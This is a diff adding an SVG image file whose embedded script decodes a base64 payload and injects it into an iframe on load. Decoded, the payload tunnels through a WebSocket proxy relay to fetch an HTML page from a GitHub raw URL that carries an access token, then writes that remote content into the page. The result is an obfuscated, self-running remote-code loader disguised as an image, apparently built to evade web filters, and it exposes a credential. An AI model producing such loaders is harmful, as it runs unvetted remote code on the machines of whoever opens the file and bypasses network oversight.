@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    xmlns:xhtml="http://www.w3.org/1999/xhtml"
+    width="100%"
+    height="100%"
+    style="display:block;margin:0;padding:0;">
+
+    <foreignObject
+        x="0"
+        y="0"
+        width="100%"
+        height="100%"
+        style="overflow:visible;">
+
+        <xhtml:iframe
+            id="html-frame"
+            frameborder="0"
+            scrolling="auto"
+            style="
+                position:absolute;
+                inset:0;
+                width:100%;
+                height:100%;
+                border:0;
+                margin:0;
+                padding:0;
+                display:block;
+                overflow:auto;
+            ">
+        </xhtml:iframe>
+
+    </foreignObject>
+
+    <script><![CDATA[
+
+(function () {
+
+    const encoded = "PFNjcmlwdD4oZnVuY3Rpb24oKSB7CiAgICB2YXIgd3MgPSBuZXcgV2ViU29ja2V0KCJ3c3M6Ly93aXNwLm1lcmN1cnl3b3JrLnNob3AvIik7CiAgICB3cy5iaW5hcnlUeXBlID0gJ2FycmF5YnVmZmVyJzsKICAgIHZhciByID0gJyc7CiAgICBmdW5jdGlvbiB3MzIoYSwgdikgeyBhWzFdPXYmMHhGRjsgYVsyXT0odj4+OCkmMHhGRjsgYVszXT0odj4+MTYpJjB4RkY7IGFbNF09KHY+PjI0KSYweEZGOyB9CiAgICB3cy5vbm9wZW4gPSBmdW5jdGlvbigpIHsKICAgICAgICB2YXIgaG9zdCA9ICdyYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RoZS1VbmJsb2NrZWQtSW5pdGlhdGl2ZS1SZXBvLUFjY2Vzcy9wcm94eWZveC1odG1sLXB1YmxpYy9yZWZzL2hlYWRzL21haW4vcHJveHlmb3guaHRtbD90b2tlbj1HSFNBVDBBQUFBQUFFUTVRU0xaQU9CSVVQQ0IzSk5INEVVNjJZQjZMTkEnOwogICAgICAgIHZhciBoYiA9IG5ldyBUZXh0RW5jb2RlcigpLmVuY29kZShob3N0KTsKICAgICAgICB2YXIgYyA9IG5ldyBVaW50OEFycmF5KDggKyBoYi5sZW5ndGgpOwogICAgICAgIGNbMF0gPSAweDAxOyB3MzIoYywgMSk7IGNbNV0gPSAweDAxOyBjWzZdID0gODA7IGNbN10gPSAwOwogICAgICAgIGMuc2V0KGhiLCA4KTsKICAgICAgICB3cy5zZW5kKGMpOwogICAgICAgIHZhciByZXEgPSBuZXcgVGV4dEVuY29kZXIoKS5lbmNvZGUoJ0dFVCAvIEhUVFAvMS4xXHJcbkhvc3Q6ICcgKyBob3N0ICsgJ1xyXG5Db25uZWN0aW9uOiBjbG9zZVxyXG5cclxuJyk7CiAgICAgICAgdmFyIGQgPSBuZXcgVWludDhBcnJheSg1ICsgcmVxLmxlbmd0aCk7CiAgICAgICAgZFswXSA9IDB4MDI7IHczMihkLCAxKTsKICAgICAgICBkLnNldChyZXEsIDUpOwogICAgICAgIHdzLnNlbmQoZCk7CiAgICAgICAgd3Mub25tZXNzYWdlID0gZnVuY3Rpb24oZSkgewogICAgICAgICAgICB2YXIgYiA9IG5ldyBVaW50OEFycmF5KGUuZGF0YSk7CiAgICAgICAgICAgIGlmIChiWzBdID09IDB4MDIpIHIgKz0gbmV3IFRleHREZWNvZGVyKCkuZGVjb2RlKGIuc2xpY2UoNSkpOwogICAgICAgICAgICBpZiAoYlswXSA9PSAweDA0KSB7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5vcGVuKCk7CiAgICAgICAgICAgICAgICBkb2N1bWVudC53cml0ZShyLnNwbGl0KCdcclxuXHJcbicpWzFdKTsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmNsb3NlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9OwogICAgfTsKfSkoKTs8L1NjcmlwdD4=";
+
+    /*
+     * Decode the original HTML without changing it.
+     */
+    const binary = atob(encoded);
+
+    const bytes = new Uint8Array(binary.length);
+
+    for (let i = 0; i < binary.length; i++) {
+        bytes[i] = binary.charCodeAt(i);
+    }
+
+    const html = new TextDecoder("utf-8").decode(bytes);
+
+    const frame = document.getElementById("html-frame");
+
+    if (!frame) {
+        return;
+    }
+
+    /*
+     * The original HTML goes into the iframe unchanged.
+     */
+    frame.srcdoc = html;
+
+})();
+
+    ]]></script>
+
+</svg>
